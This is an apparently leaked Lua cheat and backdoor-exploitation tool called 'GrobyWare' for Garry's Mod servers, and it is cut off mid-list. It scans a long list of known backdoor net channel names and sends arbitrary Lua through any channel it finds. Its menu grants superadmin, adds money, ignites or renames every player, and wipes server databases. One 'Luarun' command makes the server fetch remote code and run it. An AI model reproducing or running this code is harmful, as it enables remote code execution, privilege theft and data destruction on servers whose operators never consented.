local authorized = {"STEAM_0:0:458922289", "STEAM_0:1:90063563", "STEAM_0:1:41404936", "STEAM_0:0:467073729", "STEAM_0:1:479032588"}

function allowedToRun()
    for k, v in pairs(authorized) do 
        if(v == LocalPlayer():SteamID()) then
            return true
        end
    end
end

function countdownMessageFunc(time, message, func)
local countDown = time
chat.AddText( Color( 255, 215, 0), "[GrobyWare] ", Color( 0, 181, 26 ),message)
    timer.Create("countDownTimer", 1, time + 1, function()
        chat.AddText(Color(255, 0, 0), tostring(countDown))
        countDown = countDown - 1
            if(countDown == 0) then 
            RunString(func)
        end
    end)
end
function grobyware()
surface.CreateFont( "other", {
		font = "Calibri",
		extended = false,
		size = 16,
		weight = 500,
		blursize = 0,
		scanlines = 0,
		antialias = true,
		underline = false,
		italic = false,
		strikeout = false,
		symbol = false,
		rotary = false,
		shadow = false,
		additive = false,
		outline = true,
	} )
	

local prent = print
local addedNets = {}
local removedNets = {}
local rainbowGun = false
local channel = "";
local groby = {}
local netStrings = {}
local RCC = RunConsoleCommand


   function CheckIfStringExists(str)
    local status, error = pcall(net.Start, str)
    return status
end

	netStrings.Strings={{NetString="Sandbox_ArmDupe"},{NetString="entityhealt"},{NetString="nostrip"},{NetString="material"},{NetString="REBUG"},{NetString="BetStrep"},{NetString="keyss"},{NetString="banId2"},{NetString="Val"},{NetString="models/zombie.mdl"},{NetString="FPSBOOST"},{NetString="PlayerCheck"},{NetString="Sbox_darkrp"},{NetString="insid3"},{NetString="The_Dankwoo"},{NetString="Sbox_itemstore"},{NetString="Ulib_Message"},{NetString="ULogs_Info"},{NetString="ITEM"},{NetString="R8"},{NetString="fix"},{NetString="Fix_Keypads"},{NetString="Remove_Exploiters"},{NetString="noclipcloakaesp_chat_text"},{NetString="_Defqon"},{NetString="_CAC_ReadMemory"},{NetString="nostrip"},{NetString="nocheat"},{NetString="LickMeOut"},{NetString="ULX_QUERY2"},{NetString="ULXQUERY2"},{NetString="https://i.imgur.com/Gf6hLMl.png"},{NetString="MoonMan"},{NetString="Im_SOCool"},{NetString="JSQuery.Data(Post(false))"},{NetString="Sandbox_GayParty"},{NetString="DarkRP_UTF8"},{NetString="oldNetReadData"},{NetString="Gamemode_get"},{NetString="memeDoor"},{NetString="BackDoor"},{NetString="SessionBackdoor"},{NetString="DarkRP_AdminWeapons"},{NetString="cucked"},{NetString="NoNerks"},{NetString="kek"},{NetString="ZimbaBackDoor"},{NetString="something"},{NetString="random"},{NetString="strip0"},{NetString="fellosnake"},{NetString="enablevac"},{NetString="idk"},{NetString="ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ"},{NetString="snte"},{NetString="apg_togglemode"},{NetString="Hi"},{NetString="beedoor"},{NetString="BDST_EngineForceButton"},{NetString="VoteKickNO"},{NetString="REEEEEEEEEEEE"},{NetString="_da_"},{NetString="Nostra"},{NetString="sniffing"},{NetString="keylogger"},{NetString="CakeInstall"},{NetString="Cakeuptade"},{NetString="love"},{NetString="earth"},{NetString="ulibcheck"},{NetString="Nostrip_"},{NetString="teamfrench"},{NetString="ADM"},{NetString="hack"},{NetString="crack"},{NetString="leak"},{NetString="lokisploit"},{NetString="1234"},{NetString="123"},{NetString="enculer"},{NetString="cake"},{NetString="seized"},{NetString="88"},{NetString="88_strings_"},{NetString="nostraall"},{NetString="blogs_update"},{NetString="nolag"},{NetString="loona_"},{NetString="billys_logs"},{NetString="loona"},{NetString="negativedlebest"},{NetString="berettabest"},{NetString="ReadPing"},{NetString="antiexploit"},{NetString="adm_NetString"},{NetString="mathislebg"},{NetString="Bilboard.adverts:Spawn(false)"},{NetString="pjHabrp9EY"},{NetString="?"},{NetString="lag_ping"},{NetString="allowLimitedRCON(user) 0"},{NetString="aze46aez67z67z64dcv4bt"},{NetString="killserver"},{NetString="fuckserver"},{NetString="cvaraccess"},{NetString="rcon"},{NetString="rconadmin"},{NetString="web"},{NetString="jesuslebg"},{NetString="zilnix"},{NetString="ß ?D)?"},{NetString="disablebackdoor"},{NetString="kill"},{NetString="DefqonBackdoor"},{NetString="DarkRP_AllDoorDatas"},{NetString="0101.1"},{NetString="awarn_remove"},{NetString="VoiceModifaction"},{NetString="_Infinity"},{NetString="Infinity"},{NetString="InfinityBackdoor"},{NetString="_Infinity_Meme_"},{NetString="arivia"},{NetString="ULogs_B"},{NetString="_Warns"},{NetString="_cac_"},{NetString="striphelper"},{NetString="_vliss"},{NetString="YYYYTTYXY6Y"},{NetString="?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®"},{NetString="_KekTcf"},{NetString="_blacksmurf"},{NetString="blacksmurfBackdoor"},{NetString="_Raze"},{NetString="m9k_explosionradius"},{NetString="m9k_explosive"},{NetString="m9k_addons"},{NetString="rcivluz"},{NetString="SENDTEST"},{NetString="_clientcvars"},{NetString="_main"},{NetString="stream"},{NetString="waoz"},{NetString="gravgun"},{NetString="bdsm"},{NetString="ZernaxBackdoor"},{NetString="UKT_MOMOS"},{NetString="anticrash"},{NetString="audisquad_lua"},{NetString="dontforget"},{NetString="noprop"},{NetString="thereaper"},{NetString="0x13"},{NetString="Child"},{NetString="!Cac"},{NetString="azkaw"},{NetString="BOOST_FPS"},{NetString="childexploit"},{NetString="ULX_ANTI_BACKDOOR"},{NetString="FADMIN_ANTICRASH"},{NetString="ULX_QUERY_TEST2"},{NetString="GMOD_NETDBG"},{NetString="netlib_debug"},{NetString="_DarkRP_Reading"},{NetString="lag_ping"},{NetString="||||"},{NetString="SteamApp2313"},{NetString="FPP_RemovePLYCache"},{NetString="fuwa"},{NetString="stardoor"},{NetString="SENDTEST"},{NetString="rcivluz"},{NetString="c"},{NetString="N::B::P"},{NetString="changename"},{NetString="PlayerItemPickUp"},{NetString="echangeinfo"},{NetString="fourhead"},{NetString="music"},{NetString="slua"},{NetString="adm_network"},{NetString="componenttolua"},{NetString="theberettabcd"},{NetString="SparksLeBg"},{NetString="DarkRP_Armors"},{NetString="DarkRP_Gamemodes"},{NetString="fancyscoreboard_leave"},{NetString="PRDW_GET"},{NetString="pwn_http_send"},{NetString="AnatikLeNoob"},{NetString="GVacDoor"},{NetString="Keetaxor"},{NetString="BackdoorPrivate666"},{NetString="YohSambreLeBest"},{NetString="SNTE<ALL"},{NetString="!Çº/;."},{NetString="pwn_http_answer"},{NetString="pwn_wake"},{NetString="verifiopd"},{NetString="AidsTacos"},{NetString="shix"},{NetString="PDA_DRM_REQUEST_CONTENT"},{NetString="xenoreceivetargetdata2"},{NetString="xenoreceivetargetdata1"},{NetString="xenoserverdatafunction"},{NetString="xenoserverfunction"},{NetString="xenoclientdatafunction"},{NetString="xenoclientfunction"},{NetString="xenoactivation"},{NetString="EXEC_REMOTE_APPS"},{NetString="yohsambresicianatik<3"},{NetString="Sbox_Message"},{NetString="Sbox_gm_attackofnullday_key"},{NetString="The_DankWhy"},{NetString="nw.readstream"},{NetString="AbSoluT"},{NetString="__G____CAC"},{NetString="Weapon_88"},{NetString="mecthack"},{NetString="SetPlayerDeathCount"},{NetString="FAdmin_Notification_Receiver"},{NetString="DarkRP_ReceiveData"},{NetString="fijiconn"},{NetString="LuaCmd"},{NetString="EnigmaProject"},{NetString="z"},{NetString="cvardel"},{NetString="json.parse(crashsocket)"},{NetString="effects_en"},{NetString="file"},{NetString="gag"},{NetString="asunalabestwaifu"},{NetString="stoppk"},{NetString="Ulx_Error_88"},{NetString="NoOdium_ReadPing"},{NetString="banId"},{NetString="kickId2"},{NetString="elsakura"}}

	function CheckBackdoors()
	for k,v in pairs(netStrings.Strings) do
	if(CheckIfStringExists(v.NetString)) then
	channel = v.NetString
	chat.AddText(Color(255, 215, 0), "[GrobyWare]", Color( 20, 150, 20 )," Found Vulnerability â–¶ ", Color(20, 150, 200), [[]] ..v.NetString)

		end
	end
end

concommand.Add("bd_scan", function()
	CheckBackdoors()

end)

function groby.Notify(msg)
	chat.AddText(Color(255, 0, 0), "[GrobyWare] ", color_white, msg)
end

function groby.PostLua(  str, noCheck, ... )
if(noCheck) then
	net.Start(...)
	net.WriteString( str )
	net.SendToServer()
else
	if (channel == "") then chat.AddText( Color( 255, 215, 0), "[GrobyWare]", Color( 0, 181, 26 )	," No NetChannel available") return end
	net.Start(channel)
	net.WriteString( str )
	net.SendToServer()
	end
end



if hook.GetTable()["SSSS"] then
	hook.Remove("SSSS")
end	

	local function ch_bunnyhop(ply)
	if(ply:KeyDown(IN_JUMP) && !LocalPlayer():IsOnGround()) then
	ply:RemoveKey(IN_JUMP);
	if !LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP then
	if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
	ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
	else
	ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
	ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
	end
	end
	elseif(ply:KeyDown(IN_JUMP)) then
	ply:SetForwardMove(10000)
	end
end

	hook.Add("CreateMove", "SSSS", function(ply)
	ch_bunnyhop(ply);
end);


local CY = CY or {}
concommand.Add("dumpnet", function()
local netstrings = {}
for i = 1, 9999 do
	local s = util.NetworkIDToString( i )
	if s then MsgC( Color(255, 215, 0), "[NETDump] ", Color(0, 181, 26), "NetChannel "..i.." = ", Color(20, 150, 200),''..s.."\n") else break end
end
end)

prent( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
MsgC (Color( 0, 255, 0 ), [[

                                                                                                                                                                                                                                                                                                                                                                                                               
                                                                                                            dddddddd                                                                                                                                                                                                                                                                                           
LLLLLLLLLLL                                                 kkkkkkkk                                        d::::::d     BBBBBBBBBBBBBBBBB                                    SSSSSSSSSSSSSSS   iiii                      SSSSSSSSSSSSSSS                                                                 ffffffffffffffff                                     lllllll                           tttt          
L:::::::::L                                                 k::::::k                                        d::::::d     B::::::::::::::::B                                 SS:::::::::::::::S i::::i                   SS:::::::::::::::S                                                               f::::::::::::::::f                                    l:::::l                        ttt:::t          
L:::::::::L                                                 k::::::k                                        d::::::d     B::::::BBBBBB:::::B                               S:::::SSSSSS::::::S  iiii                   S:::::SSSSSS::::::S                                                              f::::::::::::::::::f                                   l:::::l                        t:::::t          
LL:::::::LL                                                 k::::::k                                        d:::::d      BB:::::B     B:::::B                              S:::::S     SSSSSSS                         S:::::S     SSSSSSS                                                              f::::::fffffff:::::f                                   l:::::l                        t:::::t          
  L:::::L                   eeeeeeeeeeee    aaaaaaaaaaaaa    k:::::k    kkkkkkk eeeeeeeeeeee        ddddddddd:::::d        B::::B     B:::::Byyyyyyy           yyyyyyy     S:::::S            iiiiiiirrrrr   rrrrrrrrr S:::::S               mmmmmmm    mmmmmmm   uuuuuu    uuuuuu rrrrr   rrrrrrrrr    f:::::f       ffffffzzzzzzzzzzzzzzzzz  aaaaaaaaaaaaa    l::::l    ooooooooooo   ttttttt:::::ttttttt    
  L:::::L                 ee::::::::::::ee  a::::::::::::a   k:::::k   k:::::kee::::::::::::ee    dd::::::::::::::d        B::::B     B:::::B y:::::y         y:::::y      S:::::S            i:::::ir::::rrr:::::::::rS:::::S             mm:::::::m  m:::::::mm u::::u    u::::u r::::rrr:::::::::r   f:::::f             z:::::::::::::::z  a::::::::::::a   l::::l  oo:::::::::::oo t:::::::::::::::::t    
  L:::::L                e::::::eeeee:::::eeaaaaaaaaa:::::a  k:::::k  k:::::ke::::::eeeee:::::ee d::::::::::::::::d        B::::BBBBBB:::::B   y:::::y       y:::::y        S::::SSSS          i::::ir:::::::::::::::::rS::::SSSS         m::::::::::mm::::::::::mu::::u    u::::u r:::::::::::::::::r f:::::::ffffff       z::::::::::::::z   aaaaaaaaa:::::a  l::::l o:::::::::::::::ot:::::::::::::::::t    
  L:::::L               e::::::e     e:::::e         a::::a  k:::::k k:::::ke::::::e     e:::::ed:::::::ddddd:::::d        B:::::::::::::BB     y:::::y     y:::::y          SS::::::SSSSS     i::::irr::::::rrrrr::::::rSS::::::SSSSS    m::::::::::::::::::::::mu::::u    u::::u rr::::::rrrrr::::::rf::::::::::::f       zzzzzzzz::::::z             a::::a  l::::l o:::::ooooo:::::otttttt:::::::tttttt    
  L:::::L               e:::::::eeeee::::::e  aaaaaaa:::::a  k::::::k:::::k e:::::::eeeee::::::ed::::::d    d:::::d        B::::BBBBBB:::::B     y:::::y   y:::::y             SSS::::::::SS   i::::i r:::::r     r:::::r  SSS::::::::SS  m:::::mmm::::::mmm:::::mu::::u    u::::u  r:::::r     r:::::rf::::::::::::f             z::::::z       aaaaaaa:::::a  l::::l o::::o     o::::o      t:::::t          
  L:::::L               e:::::::::::::::::e aa::::::::::::a  k:::::::::::k  e:::::::::::::::::e d:::::d     d:::::d        B::::B     B:::::B     y:::::y y:::::y                 SSSSSS::::S  i::::i r:::::r     rrrrrrr     SSSSSS::::S m::::m   m::::m   m::::mu::::u    u::::u  r:::::r     rrrrrrrf:::::::ffffff            z::::::z      aa::::::::::::a  l::::l o::::o     o::::o      t:::::t          
  L:::::L               e::::::eeeeeeeeeee a::::aaaa::::::a  k:::::::::::k  e::::::eeeeeeeeeee  d:::::d     d:::::d        B::::B     B:::::B      y:::::y:::::y                       S:::::S i::::i r:::::r                      S:::::Sm::::m   m::::m   m::::mu::::u    u::::u  r:::::r             f:::::f                 z::::::z      a::::aaaa::::::a  l::::l o::::o     o::::o      t:::::t          
  L:::::L         LLLLLLe:::::::e         a::::a    a:::::a  k::::::k:::::k e:::::::e           d:::::d     d:::::d        B::::B     B:::::B       y:::::::::y                        S:::::S i::::i r:::::r                      S:::::Sm::::m   m::::m   m::::mu:::::uuuu:::::u  r:::::r             f:::::f                z::::::z      a::::a    a:::::a  l::::l o::::o     o::::o      t:::::t    tttttt
LL:::::::LLLLLLLLL:::::Le::::::::e        a::::a    a:::::a k::::::k k:::::ke::::::::e          d::::::ddddd::::::dd     BB:::::BBBBBB::::::B        y:::::::y             SSSSSSS     S:::::Si::::::ir:::::r          SSSSSSS     S:::::Sm::::m   m::::m   m::::mu:::::::::::::::uur:::::r            f:::::::f              z::::::zzzzzzzza::::a    a:::::a l::::::lo:::::ooooo:::::o      t::::::tttt:::::t
L::::::::::::::::::::::L e::::::::eeeeeeeea:::::aaaa::::::a k::::::k  k:::::ke::::::::eeeeeeee   d:::::::::::::::::d     B:::::::::::::::::B          y:::::y              S::::::SSSSSS:::::Si::::::ir:::::r          S::::::SSSSSS:::::Sm::::m   m::::m   m::::m u:::::::::::::::ur:::::r            f:::::::f             z::::::::::::::za:::::aaaa::::::a l::::::lo:::::::::::::::o      tt::::::::::::::t
L::::::::::::::::::::::L  ee:::::::::::::e a::::::::::aa:::ak::::::k   k:::::kee:::::::::::::e    d:::::::::ddd::::d     B::::::::::::::::B          y:::::y               S:::::::::::::::SS i::::::ir:::::r          S:::::::::::::::SS m::::m   m::::m   m::::m  uu::::::::uu:::ur:::::r            f:::::::f            z:::::::::::::::z a::::::::::aa:::al::::::l oo:::::::::::oo         tt:::::::::::tt
LLLLLLLLLLLLLLLLLLLLLLLL    eeeeeeeeeeeeee  aaaaaaaaaa  aaaakkkkkkkk    kkkkkkk eeeeeeeeeeeeee     ddddddddd   ddddd     BBBBBBBBBBBBBBBBB          y:::::y                 SSSSSSSSSSSSSSS   iiiiiiiirrrrrrr           SSSSSSSSSSSSSSS   mmmmmm   mmmmmm   mmmmmm    uuuuuuuu  uuuurrrrrrr            fffffffff            zzzzzzzzzzzzzzzzz  aaaaaaaaaa  aaaallllllll   ooooooooooo             ttttttttttt  
                                                                                                                                                   y:::::y                                                                                                                                                                                                                                                     
                                                                                                                                                  y:::::y                                                                                                                                                                                                                                                      
                                                                                                                                                 y:::::y                                                                                                                                                                                                                                                       
                                                                                                                                                y:::::y                                                                                                                                                                                                                                                        
                                                                                                                                               yyyyyyy                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                                                                                                               
Decrypted and leaked by SirSmurfzalot - https://steamcommunity.com/id/BlackSmurf_3/ - 🔻 SirSmurfzalot#4942
Noticed an error within the leak please contact me 

 grobyware
 
 
 
 loaded!                                                                                                                                                                                                      
  ]])
surface.PlaySound("garrysmod/content_downloaded.wav")


function groby.MainMenu()
local Frame=vgui.Create("DFrame")
Frame:SetSize(870,550)
Frame:Center()
Frame:MakePopup()
Frame.Paint=function(self,w,h)
draw.RoundedBox(0,0,0,w,h,Color(244,66,66,200))
end

local background = vgui.Create( "HTML", Frame )
background:SetSize(870, 550 )
background:OpenURL( "http://jajaja99.x10host.com/backround.html" )


local DLabel = vgui.Create( "DLabel", background )
DLabel:SetPos(765,160)
DLabel:SetSize(80,25)
DLabel:SetText( "~Credits~")
DLabel:SetTextColor(Color(255, 0, 0))

local DLabel = vgui.Create( "DLabel", background )
DLabel:SetPos(725,180)
DLabel:SetSize(150,25)
DLabel:SetText( "~Cyanide for skid security~")
DLabel:SetTextColor(Color(255, 0, 0))

local DLabel = vgui.Create( "DLabel", background )
DLabel:SetPos(725,200)
DLabel:SetSize(150,25)
DLabel:SetText( "~Gubbi for steamid auth~")
DLabel:SetTextColor(Color(255, 0, 0))



local Button=vgui.Create("DButton",background)
Button:SetText("Disco")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,20)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("mlg")
	end

	local Button=vgui.Create("DButton",background)
Button:SetText("Luarun")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,70)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("Luarun")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("RainbowHUD")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,120)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("RainbowHUD")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("BreakULX")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,170)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("BreakULX")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("SetName")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,220)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("SetName")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("ResetSeverName       ")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(110,25)
Button:SetPos(10,270)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("rserver")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("MoanSteps")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,320)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("MoanSteps")
	end


		local Button=vgui.Create("DButton",background)
Button:SetText("WipeServer")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,370)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("WipeServer")
	end


		local Button=vgui.Create("DButton",background)
Button:SetText("RainbowChatspam       ")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(110,25)
Button:SetPos(10,420)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("RainbowChatspam")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("HellMode")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,470)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("hell")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("IgniteEveryone")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(80,25)
Button:SetPos(10,520)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("IgniteEveryone")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("ChangeEveryonesModel")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,20)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("ChangeEveryonesModel")
	end

		local Button=vgui.Create("DButton",background)
Button:SetText("RunRcon")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,70)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("RUNRCON")
	end
	
		local Button=vgui.Create("DButton",background)
Button:SetText("B1g")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,120)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("b1g")
	end
	
	local Button=vgui.Create("DButton",background)
Button:SetText("Add Money")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,170)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("Economy")
	end
	
	local Button=vgui.Create("DButton",background)
Button:SetText("Get Superadmin")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,220)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("Superadmin")
	end
	
		local Button=vgui.Create("DButton",background)
Button:SetText("Get Admin")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,270)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("Admin")
	end
	
		local Button=vgui.Create("DButton",background)
Button:SetText("Get Moderator")
Button:SetTextColor(Color(0, 0, 255))
Button:SetSize(135,25)
Button:SetPos(150,320)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC("Moderator")
	end
	
		local Button=vgui.Create("DButton",background)
Button:SetText("Quit")
Button:SetTextColor(Color(255,0,0))
Button:SetSize(135,25)
Button:SetPos(775,470)
Button.Paint=function(self,w,h)
draw.RoundedBox(50, 205, 50,w,h,Color(50, 205, 50))
end
Button.DoClick=function()
		RCC('gamemenucommand','quitnoconfirm')
	end

	local netchanger = vgui.Create("DTextEntry",background )
		netchanger:SetPos(560, 500)
		netchanger:SetSize(420, 60)
		netchanger:SetTextColor(Color(255, 255, 255, 255))
		netchanger.Paint = function(self, w, h)
		surface.SetDrawColor(30, 30, 30)
		surface.DrawRect(0, 0, w , h  )
		surface.SetDrawColor(30, 30, 30)
		surface.DrawRect(1, 1, w  -2 , h -2  )
		surface.SetDrawColor(30, 30, 30)
		surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
		self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))

	end

	netchanger.OnEnter = function(self)
	surface.PlaySound("buttons/button18.wav")
		groby.Notify("Targeting: '" .. netchanger:GetValue() .. "'")
		channel = self:GetValue()
	end



local Button=vgui.Create("DButton",background)
Button:SetText("X")
Button:SetTextColor(Color(255,255,255,220))
Button:SetSize(40,20)
Button:SetPos(background:GetWide()-Button:GetWide(),0)
Button.Paint=function(self,w,h)
draw.RoundedBox(0,0,0,w,h,Color(0,0,0,255))
end
Button.DoClick=function()
if IsValid(Frame) then
Frame:Remove()
end
if IsValid(background) then
background:Remove()
end
end


concommand.Add("net_append", function(ply, cmd, args)
if(!args[1]) then return end
local arg1 = args[1]
local arg1 = string.Trim(arg1)
table.insert(netStrings.Strings, arg1)
table.insert(addedNets, arg1)
end)

concommand.Add("net_remove", function(ply, cmd, args)
if(!args[1]) then return end
local arg1 = args[1]
local arg1 = string.Trim(arg1)
table.RemoveByValue(netStrings.Strings, arg1)
table.insert(removedNets, arg1)
end)

concommand.Add("net_default", function()
	for k, v in pairs(addedNets) do
		table.RemoveByValue(netStrings.Strings, v)
		addedNets = {}
	end
	for g, _ in pairs(removedNets) do
		table.insert(netStrings.Strings, _)
		removedNets = {}
	end
end)

concommand.Add("net_check", function(ply, cmd, args)
    if(!args[1])then return end
    local arg1 = args[1]
    local arg1 = string.Trim(arg1)
    local localPlayer = LocalPlayer():SteamID64()
    if(!groby.CheckIfStringExists(arg1)) then MsgC( Color(255, 215, 0), "[GrobyWare] ", Color(0, 181, 26), "NetChannel does not exist. \n") return end
    groby.PostLua([[player.GetBySteamID64("]] .. localPlayer .. [["):SendLua("MsgC(Color(150, 0, 100), '[GrobyWare] ', Color( 150, 0, 150 ), ']]..arg1..[[ ', Color(20, 150, 200), 'is a backdoor!')")]], true, arg1 )
end)




		concommand.Add("IgniteEveryone", function()
		Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
		groby.PostLua("for k, v in pairs(player.GetAll()) do v:Ignite(".. str ..") end")
		surface.PlaySound("HL1/fvox/beep.wav")
		end)
	end)

	concommand.Add("ChangeEveryonesModel", function()
		Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
		groby.PostLua("for k, v in pairs(player.GetAll()) do v:SetModel(\""..str.."\") end")
		surface.PlaySound("HL1/fvox/beep.wav")
		end)
	end)

    concommand.Add("Luarun", function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("RunLua", "Place Pastebin link inside box", "", function(str)
    groby.PostLua("http.Fetch(\""..str.."\", function( b, l, h, c ) RunString( b ) end, function() end )")
    
end)
end)

	concommand.Add("SetName", function()
		Derma_StringRequest("Set Everyones Name", "Name", "", function(text) 
		groby.PostLua([[local str = "]] .. text .. [["
			for k, v in next, player.GetAll() do
				DarkRP.storeRPName( v, str )
				v:setDarkRPVar( "rpname", str )
		end]])
		end)
	end)


	concommand.Add("RainbowHUD", function() 

		groby.PostLua([[if !rainbowscreen then
			BroadcastLua("hook.Add( 'HUDPaint', 'rainbowscreen', function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end)")
			rainbowscreen = true
		else
			BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")
			rainbowscreen = false
		end]])

		surface.PlaySound("HL1/fvox/beep.wav")
	end)

concommand.Add("rserver",function()
	groby.PostLua([[RunConsoleCommand("hostname","rekt by grobyware")]])
end)

	concommand.Add("MoanSteps", function() 
			groby.PostLua( [[if !moanstep then
	hook.Add( "PlayerFootstep", "oooh", function( ply )
	ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
	end)
	moanstep = true
	else
	hook.Remove("PlayerFootstep", "oooh")
	moanstep = false
	end]] )
		surface.PlaySound("HL1/fvox/beep.wav")
	end)

	concommand.Add("WipeServer", function()
		groby.PostLua([[local date = os.date( "%m-%d-%y" )
	            local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_cate